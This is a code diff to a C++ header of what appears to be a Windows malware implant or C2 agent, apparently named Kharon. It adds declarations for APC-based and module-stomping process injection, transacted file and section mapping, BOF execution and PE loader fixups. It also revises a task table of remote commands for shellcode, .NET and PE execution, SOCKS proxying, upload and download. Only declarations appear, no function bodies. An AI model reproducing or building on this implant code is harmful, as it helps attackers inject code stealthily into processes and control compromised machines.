@@ -5,6 +5,7 @@
 #include <ntstatus.h>
 #include <guiddef.h>
 #include <winsock.h>
+#include <ktmw32.h>
 #include <stdio.h>
 
 namespace mscorlib {
@@ -274,6 +275,9 @@ namespace Root {
             DECLAPI( LoadLibraryA ); 
             DECLAPI( GetProcAddress );
             DECLAPI( GetModuleHandleA );
+            DECLAPI( EnumProcessModules );
+            DECLAPI( GetModuleFileNameExA );
+            DECLAPI( GetModuleFileNameW );
 
             DECLAPI( CreateTimerQueueTimer );
 
@@ -285,8 +289,11 @@ namespace Root {
             DECLAPI( GetConsoleWindow );
             DECLAPI( AllocConsole );
 
+            DECLAPI( CreateTransaction );
+
             DECLAPI( CreateFileA );
             DECLAPI( CreateFileW );
+            DECLAPI( CreateFileTransactedA );
             DECLAPI( CreatePipe );
             DECLAPI( GetCurrentDirectoryA );
             DECLAPI( PeekNamedPipe );
@@ -315,6 +322,8 @@ namespace Root {
             DECLAPI( TlsAlloc );
             DECLAPI( TlsSetValue );
             DECLAPI( TlsGetValue );
+            DECLAPI( TerminateThread );
+            DECLAPI( TerminateProcess );
             DECLAPI( OpenThread );
             DECLAPI( ResumeThread );
             DECLAPI( CreateThread );
@@ -357,6 +366,9 @@ namespace Root {
             RSL_TYPE( LoadLibraryA ),
             RSL_TYPE( GetProcAddress ),
             RSL_TYPE( GetModuleHandleA ),
+            RSL_TYPE( EnumProcessModules ),
+            RSL_TYPE( GetModuleFileNameExA ),
+            RSL_TYPE( GetModuleFileNameW ),
 
             RSL_TYPE( CreateTimerQueueTimer ),
 
@@ -368,8 +380,11 @@ namespace Root {
             RSL_TYPE( GetConsoleWindow ),
             RSL_TYPE( AllocConsole ),
         
+            RSL_TYPE( CreateTransaction ),
+
             RSL_TYPE( CreateFileA ),
             RSL_TYPE( CreateFileW ),
+            RSL_TYPE( CreateFileTransactedA ),
             RSL_TYPE( CreatePipe ),
             RSL_TYPE( GetCurrentDirectoryA ),
             RSL_TYPE( PeekNamedPipe ),
@@ -395,6 +410,11 @@ namespace Root {
         
             RSL_TYPE( GetComputerNameExA ),
         
+            RSL_TYPE( TlsAlloc ),
+            RSL_TYPE( TlsSetValue ),
+            RSL_TYPE( TlsGetValue ),
+            RSL_TYPE( TerminateThread ),
+            RSL_TYPE( TerminateProcess ),
             RSL_TYPE( OpenThread ),
             RSL_TYPE( ResumeThread ),
             RSL_TYPE( CreateThread ),
@@ -449,6 +469,8 @@ namespace Root {
             DECLAPI( NtCreateSection );
             DECLAPI( NtMapViewOfSection );
 
+            // DECLAPI( RtlFillMemory );
+
             DECLAPI( LdrGetProcedureAddress );
     
             DECLAPI( NtOpenProcess );
@@ -486,6 +508,8 @@ namespace Root {
             DECLAPI( RtlCreateTimerQueue );
             DECLAPI( RtlDeleteTimerQueue );
 
+            DECLAPI( RtlAddFunctionTable );
+
             DECLAPI( RtlAddVectoredExceptionHandler );
             DECLAPI( RtlAddVectoredContinueHandler );
             DECLAPI( RtlRemoveVectoredContinueHandler );
@@ -506,6 +530,8 @@ namespace Root {
             RSL_TYPE( NtProtectVirtualMemory ),
             RSL_TYPE( NtCreateSection ),
             RSL_TYPE( NtMapViewOfSection ),
+
+            // RSL_TYPE( RtlFillMemory ),
 
             RSL_TYPE( LdrGetProcedureAddress ),
     
@@ -543,6 +569,8 @@ namespace Root {
             RSL_TYPE( RtlDeleteTimer ),
             RSL_TYPE( RtlCreateTimerQueue ),
             RSL_TYPE( RtlDeleteTimerQueue ),
+
+            RSL_TYPE( RtlAddFunctionTable ),
 
             RSL_TYPE( RtlAddVectoredExceptionHandler ),
             RSL_TYPE( RtlAddVectoredContinueHandler ),
@@ -1232,7 +1260,17 @@ public:
         _In_ PIMAGE_DATA_DIRECTORY DataDir
     ) -> VOID;
 
-    auto DECLFN FixImp(
+    auto FixExp(
+        _In_ PVOID Base,
+        _In_ PIMAGE_DATA_DIRECTORY DataDir
+    ) -> VOID;
+
+    auto FixTls(
+        _In_ PVOID Base,
+        _In_ PIMAGE_DATA_DIRECTORY DataDir
+    ) -> VOID;
+
+    auto FixImp(
         _In_ PVOID Base,
         _In_ PIMAGE_DATA_DIRECTORY DataDir
     ) -> BOOL;
@@ -1532,10 +1570,6 @@ public:
         _In_ PJOBS Job
     ) -> ERROR_CODE;
 
-    auto SelfDelete( 
-        _In_ PJOBS Job
-    ) -> ERROR_CODE;
-
     auto ExecPE( 
         _In_ PJOBS Job
     ) -> ERROR_CODE;
@@ -1560,6 +1594,10 @@ public:
         _In_ PJOBS Job
     ) -> ERROR_CODE;
 
+    auto ExecBof(
+        _In_ PJOBS Job
+    ) -> ERROR_CODE;
+
     auto Exit(
         _In_ PJOBS Job
     ) -> ERROR_CODE;
@@ -1570,18 +1608,18 @@ public:
         ULONG        ID;
         ERROR_CODE ( Task::*Run )( PJOBS );
     } Mgmt[TSK_LENGTH] = {
-        Mgmt[0].ID = TkExit,       Mgmt[0].Run = &Task::Exit,
-        Mgmt[1].ID = TkFileSystem, Mgmt[1].Run = &Task::FileSystem,
-        Mgmt[2].ID = TkProcess,    Mgmt[2].Run = &Task::Process,
-        Mgmt[3].ID = TkGetInfo,    Mgmt[3].Run = &Task::Info,
-        Mgmt[4].ID = TkSelfDelete, Mgmt[4].Run = &Task::SelfDelete,
-        Mgmt[5].ID = TkExecSc,     Mgmt[5].Run = &Task::ExecSc,
-        Mgmt[6].ID = TkConfig,     Mgmt[6].Run = &Task::Config,
-        Mgmt[7].ID = TkDownload,   Mgmt[7].Run = &Task::Download,
-        Mgmt[8].ID = TkUpload,     Mgmt[8].Run = &Task::Upload,
-        Mgmt[9].ID = TkDotnet,     Mgmt[9].Run = &Task::Dotnet,
-        Mgmt[10].ID = TkSocks,     Mgmt[10].Run = &Task::Socks,
-        Mgmt[11].ID = TkExecPE,     Mgmt[11].Run = &Task::ExecPE,
+        Mgmt[0].ID = TskExit,       Mgmt[0].Run = &Task::Exit,
+        Mgmt[1].ID = TskFileSystem, Mgmt[1].Run = &Task::FileSystem,
+        Mgmt[2].ID = TskProcess,    Mgmt[2].Run = &Task::Process,
+        Mgmt[3].ID = TskGetInfo,    Mgmt[3].Run = &Task::Info,
+        Mgmt[4].ID = TskExecBof,    Mgmt[4].Run = &Task::ExecBof,
+        Mgmt[5].ID = TskExecSc,     Mgmt[5].Run = &Task::ExecSc,
+        Mgmt[6].ID = TskConfig,     Mgmt[6].Run = &Task::Config,
+        Mgmt[7].ID = TskDownload,   Mgmt[7].Run = &Task::Download,
+        Mgmt[8].ID = TskUpload,     Mgmt[8].Run = &Task::Upload,
+        Mgmt[9].ID = TskDotnet,     Mgmt[9].Run = &Task::Dotnet,
+        Mgmt[10].ID = TskSocks,     Mgmt[10].Run = &Task::Socks,
+        Mgmt[11].ID = TskExecPE,    Mgmt[11].Run = &Task::ExecPE,
     };
 };
 
@@ -1656,6 +1694,14 @@ public:
         return Enum( TdTarget, ProcessID, ThreadQtt, ThreadInfo );
     }
 
+    auto QueueAPC(
+        _In_     PVOID  CallbackFnc,
+        _In_     HANDLE ThreadHandle,
+        _In_opt_ PVOID  Argument1,
+        _In_opt_ PVOID  Argument2,
+        _In_opt_ PVOID  Argument3
+    ) -> LONG;
+
     auto InstallHwbp( VOID ) {
         return Enum( TdHwbp );
     }
@@ -1668,6 +1714,12 @@ public:
     Library( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto Load(
+        _In_ PCHAR LibName
+    ) -> UPTR;
+
+    auto GetRnd( VOID ) -> PCHAR;
+
+    auto Map(
         _In_ PCHAR LibName
     ) -> UPTR;
 };
@@ -1754,6 +1806,13 @@ public:
         _In_ ULONG  Size
     ) -> BOOL;
 
+    auto WriteAPC(
+        _In_ HANDLE Handle,
+        _In_ PVOID  Base,
+        _In_ PBYTE  Buffer,
+        _In_ ULONG  Size
+    ) -> BOOL;
+
     auto Read(
         _In_  HANDLE  Handle,
         _In_  PVOID   Base,
@@ -1768,6 +1827,30 @@ public:
         _In_ ULONG  Size,
         _In_ ULONG  FreeType
     ) -> BOOL;
+
+    auto MapView(
+        _In_        HANDLE          SectionHandle,
+        _In_        HANDLE          ProcessHandle,
+        _Inout_     PVOID           *BaseAddress,
+        _In_        ULONG_PTR       ZeroBits,
+        _In_        SIZE_T          CommitSize,
+        _Inout_opt_ PLARGE_INTEGER  SectionOffset,
+        _Inout_     PSIZE_T         ViewSize,
+        _In_        SECTION_INHERIT InheritDisposition,
+        _In_        ULONG           AllocationType,
+        _In_        ULONG           PageProtection
+    ) -> LONG;
+
+    auto CreateSection(
+        _Out_    PHANDLE            SectionHandle,
+        _In_     ACCESS_MASK        DesiredAccess,
+        _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+        _In_opt_ PLARGE_INTEGER     MaximumSize,
+        _In_     ULONG              SectionPageProtection,
+        _In_     ULONG              AllocationAttributes,
+        _In_opt_ HANDLE             FileHandle
+    ) -> LONG;
+
 };
 
 class Mask {
@@ -1865,6 +1948,14 @@ public:
     ) -> BOOL;
 
     auto Classic(
+        _In_  ULONG   ProcessID,
+        _In_  PBYTE   Buffer,
+        _In_  UPTR    Size,
+        _In_  PVOID   Param,
+        _Out_ PVOID*  Base
+    ) -> BOOL;
+
+    auto Stomp(
         _In_  ULONG   ProcessID,
         _In_  PBYTE   Buffer,
         _In_  UPTR    Size,
